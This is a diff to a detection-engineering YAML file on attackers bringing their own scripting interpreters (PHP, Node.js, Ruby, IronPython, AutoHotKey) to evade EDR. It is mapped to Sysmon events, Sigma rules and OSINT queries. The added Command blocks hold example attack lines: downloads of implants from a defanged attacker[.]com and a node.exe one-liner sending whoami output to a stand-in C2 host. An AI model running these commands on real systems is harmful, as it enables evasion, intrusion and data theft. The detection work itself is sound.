@@ -34,9 +34,15 @@ LastUpdated: '2026-03-29'
 Author: '@iimp0ster'
 
 Chokepoints:
-- Stage: Interpreter Delivery
-  Invariant: A scripting interpreter binary not normally present on the system must be written to disk or extracted from an archive.
-  WhyCantBypass: The interpreter is a compiled binary required to parse and execute scripts — it cannot be replaced by a native OS component without losing language compatibility.
+- Stage: Interpreter Deployment
+  Input: Attacker has code execution on the target
+  Invariant: A non-default scripting interpreter runtime must be introduced to the system — either written to disk as a
+    standalone binary or loaded in-memory as embedded DLLs within a .NET host process (IronPython, Boolang)
+  Observable: 'Disk-based: Sysmon EID 11 showing a vendor-signed interpreter binary (python.exe, php.exe, node.exe) written
+    to a user-writable directory. In-memory: Sysmon EID 7 showing interpreter DLLs (IronPython.dll, Microsoft.Scripting.dll)
+    loaded by a .NET host process.'
+  WhyCantBypass: The interpreter runtime is required to parse and execute scripts — it cannot be replaced by a native OS
+    component without losing language compatibility. Whether deployed as a binary or embedded DLLs, the runtime must be present.
   LogSources:
   - Sysmon Event ID 11 (File Create)
   - Sysmon Event ID 1 (Process Creation — archive extraction)
@@ -44,7 +50,10 @@ Chokepoints:
   DetectionTier: Research
   SigmaRef: sigma-rules/byosi/research.yml
 - Stage: Interpreter Execution
+  Input: Interpreter runtime is available — either as a binary on disk or as embedded DLLs in a host process
   Invariant: The non-default interpreter binary must be launched as a new process to run attacker scripts.
+  Observable: 'Sysmon EID 1 showing python.exe, node.exe, php.exe, etc. running from a non-standard path
+    (not Program Files). Command line may reveal the script being executed or inline code.'
   WhyCantBypass: Script files require their matching interpreter process to execute — there is no way to run Python/PHP/Node scripts without spawning the interpreter.
   LogSources:
   - Sysmon Event ID 1 (Process Creation)
@@ -53,7 +62,10 @@ Chokepoints:
   DetectionTier: Hunt
   SigmaRef: sigma-rules/byosi/hunt.yml
 - Stage: Malicious Script Action
+  Input: Interpreter is running with attacker-controlled script content
   Invariant: The interpreter must load attacker-controlled script content and perform an observable action (network connection, file write, process spawn, credential access).
+  Observable: 'Sysmon EID 3 showing outbound connections from the interpreter process. EID 1 showing child processes
+    spawned by the interpreter. EID 11/12/13 showing file or registry modifications.'
   WhyCantBypass: The script must interact with the OS to achieve its objective — C2 callbacks require network, data theft requires file/process access, persistence requires registry/filesystem writes.
   LogSources:
   - Sysmon Event ID 3 (Network Connection)
@@ -77,6 +89,14 @@ Variations:
     CrowdStrike, Trellix, and SentinelOne in tested environments. SentinelOne confirmed
     unable to scan PHP file types.
   VariantId: byosi-php-shell
+  Command:
+    Invocation: "# Four lines of PowerShell — evaded CrowdStrike, Trellix, SentinelOne:\nInvoke-WebRequest -Uri \"hxxps[://]windows.php.net/downloads/releases/php-8.2.0-nts-Win32-vs16-x64.zip\" -OutFile \"$env:TEMP\\php.zip\"\nExpand-Archive \"$env:TEMP\\php.zip\" -DestinationPath \"C:\\Temp\\php\"\nInvoke-WebRequest -Uri \"hxxps[://]attacker[.]com/implant.php\" -OutFile \"C:\\Temp\\php\\shell.php\"\nC:\\Temp\\php\\php.exe C:\\Temp\\php\\shell.php"
+    Context: 'Original BYOSI PoC. Downloads official PHP for Windows, extracts to C:\Temp\php, fetches PHP implant, executes. SentinelOne confirmed unable to scan PHP file types.'
+    Artifacts:
+    - 'Sysmon EID 11: php.exe written to C:\Temp\php\'
+    - 'Sysmon EID 1: php.exe running from non-standard path'
+    - 'Sysmon EID 3: php.exe making outbound C2 connection'
+  ChokepointMapping: 'PHP binary downloaded to TEMP → php.exe launched from non-standard path → C2 callback'
 - Name: PolyDrop (Multi-Language BYOSI)
   FirstSeen: 2024-Q3
   Status: Active
@@ -86,6 +106,14 @@ Variations:
     PHP, Node.js, Tcl, R, Dart, Deno, Bun, Nim, Crystal). Rapid payload deployment
     across Windows, macOS, and Linux. Vulners AI risk score 7.2 High.
   VariantId: polydrop-multi-language
+  Command:
+    Invocation: "# Supports 13 languages. Example with Ruby:\nInvoke-WebRequest -Uri \"hxxps[://]github.com/.../rubyinstaller-3.2.2-1-x64.exe\" -OutFile \"$env:TEMP\\ruby.exe\"\nStart-Process \"$env:TEMP\\ruby.exe\" -ArgumentList \"/silent\" -Wait\nInvoke-WebRequest -Uri \"hxxps[://]attacker[.]com/payload.rb\" -OutFile \"$env:TEMP\\payload.rb\"\nruby.exe \"$env:TEMP\\payload.rb\""
+    Context: 'Expanded BYOSI toolkit supporting 13 languages. Each interpreter is legitimately signed — EDR trusts the binary, cannot scan the script.'
+    Artifacts:
+    - 'Sysmon EID 11: Non-default interpreter binary written to TEMP/AppData'
+    - 'Sysmon EID 1: Interpreter running from non-standard path'
+    - 'Sysmon EID 3: Interpreter making outbound C2 connection'
+  ChokepointMapping: 'Interpreter downloaded to TEMP → launched from non-standard path → script executes → C2 callback'
 - Name: IronNetInjector (Turla APT — IronPython BYOI)
   FirstSeen: 2021-Q1
   Status: Active
@@ -96,6 +124,14 @@ Variations:
     Demonstrates nation-state adoption of BYOI tradecraft for in-memory execution
     without touching PowerShell.
   VariantId: ironnetinjector-turla-ironpython
+  Command:
+    Invocation: "# IronPython embedded via .NET:\n# Malicious Python scripts loaded into memory via IronPython runtime\n# No python.exe on disk — uses .NET-hosted IronPython DLLs\n# Injects Turla tools into legitimate processes"
+    Context: 'Turla APT. Uses IronPython via .NET to avoid dropping python.exe. Loads malicious .py scripts in memory. Documented by Unit 42.'
+    Artifacts:
+    - 'Sysmon EID 7: IronPython DLLs loaded (IronPython.dll, Microsoft.Scripting.dll)'
+    - 'Sysmon EID 1: .NET host process loading IronPython assemblies'
+    - 'Memory: Python bytecode in non-Python process memory'
+  ChokepointMapping: '.NET loads IronPython DLLs → Python scripts execute in-memory → Turla tools injected'
 - Name: Node.js Malware Delivery (ClickFix → NodeLoader)
   FirstSeen: 2025-Q1
   Status: Active
@@ -106,6 +142,14 @@ Variations:
     C2 and data exfiltration. NodeLoader variant uses sudo-prompt module for privilege
     escalation, delivering cryptominers and infostealers.
   VariantId: nodejs-malware-delivery-clickfix
+  Command:
+    Invocation: "# Delivered via ClickFix, then:\npowershell -c \"Invoke-WebRequest -Uri 'hxxps[://]nodejs[.]org/dist/v20.0.0/node-v20.0.0-win-x64.zip' -OutFile node.zip\"\nExpand-Archive node.zip -DestinationPath C:\\Users\\Public\\node\nC:\\Users\\Public\\node\\node.exe -e \"require('child_process').exec('whoami',function(e,o){require('https').request({hostname:'c2[.]attacker[.]com',path:'/'+o})})\""
+    Context: 'Microsoft documented (April 2025). PowerShell downloads node.exe, inline JavaScript for C2 and exfil. NodeLoader uses sudo-prompt for privesc.'
+    Artifacts:
+    - 'Sysmon EID 11: node.exe written to Users\Public or AppData'
+    - 'Sysmon EID 1: node.exe with -e flag and inline JavaScript'
+    - 'Sysmon EID 3: node.exe outbound to non-npm domain'
+  ChokepointMapping: 'node.exe downloaded to Public → node.exe -e inline JS → outbound C2 connection'
 - Name: Lu0Bot (Node.js C2)
   FirstSeen: 2023-Q2
   Status: Active
@@ -115,6 +159,14 @@ Variations:
     Uses WMIC for system reconnaissance. Demonstrates portable Node.js runtime bundled
     with encrypted payload scripts for full C2 capability.
   VariantId: lu0bot-nodejs-c2
+  Command:
+    Invocation: "node.exe --eval \"<encrypted_js_payload>\"\n# Uses WMIC for system recon:\nwmic computersystem get model\nwmic os get caption\n# C2 via encrypted WebSocket"
+    Context: 'Node.js-based malware accepting encrypted JavaScript. WMIC for recon. Encryption prevents script content inspection by EDR.'
+    Artifacts:
+    - 'Sysmon EID 1: node.exe with --eval flag and encrypted content'
+    - 'Sysmon EID 1: wmic.exe spawned by node.exe'
+    - 'Sysmon EID 3: node.exe WebSocket connection to C2'
+  ChokepointMapping: 'node.exe deployed → encrypted JS via --eval → WMIC recon → encrypted WebSocket C2'
 - Name: Python Bytecode Evasion (PYC Execution)
   FirstSeen: 2023-Q4
   Status: Emerging
@@ -125,6 +177,13 @@ Variations:
     that only inspect .py source files. ReversingLabs called it potentially the first
     supply chain attack exploiting PYC execution.
   VariantId: python-bytecode-pyc-evasion
+  Command:
+    Invocation: "# Attacker pre-compiles Python scripts to .pyc bytecode:\npython -m py_compile payload.py\n# Deploys python.exe + payload.pyc:\npython.exe payload.pyc\n# .pyc files bypass text-based content scanning"
+    Context: 'Pre-compiled Python bytecode (.pyc) bypasses text-based content scanning. The interpreter still must exist on disk and execute.'
+    Artifacts:
+    - 'Sysmon EID 11: python.exe + .pyc file written to non-standard path'
+    - 'Sysmon EID 1: python.exe executing .pyc file'
+  ChokepointMapping: 'python.exe + .pyc deployed → python.exe launched → bytecode executed → C2 callback'
 - Name: BYOI .NET Embedded Interpreters (Boolang, IronPython)
   FirstSeen: 2020-Q1
   Status: Active
@@ -135,20 +194,48 @@ Variations:
     in memory via .NET runtime without touching PowerShell or cmd.exe. Popularized by
     Marcello Salvati (Black Hills InfoSec) at DerbyCon 2019.
   VariantId: byoi-dotnet-embedded-interpreters
+  Command:
+    Invocation: "# .NET application embeds Boolang or IronPython runtime:\n# No standalone interpreter binary on disk\n# Scripts loaded from embedded resources or fetched remotely\n# Executes within the .NET host process"
+    Context: 'Interpreter embedded within .NET application — no standalone binary to detect on disk. Scripts execute within the .NET host process memory.'
+    Artifacts:
+    - 'Sysmon EID 7: Boolang or IronPython DLLs loaded by .NET process'
+    - 'Sysmon EID 1: .NET host with interpreter-related assemblies'
+  ChokepointMapping: '.NET host loads interpreter DLLs → scripts execute in-process → C2/payload actions'
 - Name: AutoHotKey Script Abuse
   FirstSeen: 2024-Q1
   Status: Emerging
+  SourceURL: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/the-darkgate-menace-leveraging-autohotkey-attempt-to-evade-smartscreen/
   Notes: >
     Threat actors bundle AutoHotKey interpreter with malicious .ahk scripts to deploy
     keyloggers, credential stealers, and RATs. The AHK interpreter is signed and
     trusted, allowing script execution to bypass application whitelisting.
   VariantId: autohotkey-script-abuse
+  Command:
+    Invocation: "AutoHotkey.exe malicious_script.ahk\n# AHK scripts can: keylog via SetWindowsHookEx, screenshot, execute shell commands, establish C2 via WinHTTP COM"
+    Context: 'Legitimate automation tool. Attacker brings interpreter + .ahk script. The .ahk file type is not scanned by most EDR products.'
+    Artifacts:
+    - 'Sysmon EID 11: AutoHotkey.exe written to non-standard path'
+    - 'Sysmon EID 1: AutoHotkey.exe running from AppData/Temp'
+    - 'Sysmon EID 3: AutoHotkey.exe outbound C2'
+  ChokepointMapping: 'AutoHotkey.exe + .ahk script deployed → interpreter launched → keylogging/C2 → exfil'
 
 Prerequisites:
 - Ability to write files to disk on the target system (interpreter binary + script payload)
 - The scripting interpreter must be a legitimately signed binary compatible with the target OS
 - Attacker-controlled script content must be accessible to the interpreter (local file, inline argument, or remote fetch)
 - No application whitelisting policy blocking execution of the specific interpreter binary from non-standard paths
+AttackerControls:
+- Choice of interpreter (Python, PHP, Node.js, Ruby, Perl, AutoHotKey)
+- Obfuscation of the script payload
+- Script content and payload
+- Delivery method for the interpreter
+- Persistence mechanism for the interpreter
+AttackerCannotControl:
+- Must introduce a non-default interpreter runtime (binary on disk or DLLs loaded in-memory)
+- Must launch the interpreter process or load interpreter DLLs into a host
+- Interpreter binary/DLLs are vendor-signed (legitimate code)
+- Process creation or DLL load event logs the non-standard interpreter
+- Network connections from the interpreter are logged
 
 EvolutionTimeline:
 - Date: 2019-Q3
@@ -342,16 +429,19 @@ RelatedChokepoints:
 OsintSources:
 - Platform: VirusTotal Intelligence
   Query: 'behavior_processes:"php.exe" OR behavior_processes:"node.exe" OR behavior_processes:"python.exe" tag:drops-exe'
+  URL: https://www.virustotal.com/gui/search/behavior_processes%3A%22php.exe%22%20OR%20behavior_processes%3A%22node.exe%22%20tag%3Adrops-exe
   Notes: >
     Finds malware samples that drop or execute scripting interpreters. Pivot to behavior
     tab to extract interpreter delivery path and script payload filename.
 - Platform: GitHub Code Search
   Query: '"Invoke-WebRequest" "php" "extract" "C:\\Temp" OR "C:\\Users"'
+  URL: https://github.com/search?q=%22Invoke-WebRequest%22+%22php%22+%22extract%22+%22C%3A%5CTemp%22&type=code
   Notes: >
     Finds PowerShell-based BYOSI delivery scripts that download and extract PHP (or
     other interpreters) to user-writable directories. Monitor for new delivery variants.
 - Platform: URLScan
-  Query: 'filename:php.exe OR filename:node.exe OR filename:python.exe page.url:*.zip'
+  Query: 'filename:php.exe OR filename:node.exe OR filename:python.exe OR filename:ruby.exe'
+  URL: https://urlscan.io/search/#filename%3Aphp.exe%20OR%20filename%3Anode.exe%20OR%20filename%3Apython.exe%20OR%20filename%3Aruby.exe
   Notes: >
     Finds websites hosting interpreter binaries packaged in ZIP archives — a common
     BYOSI delivery mechanism. Cross-reference with known malware distribution domains.
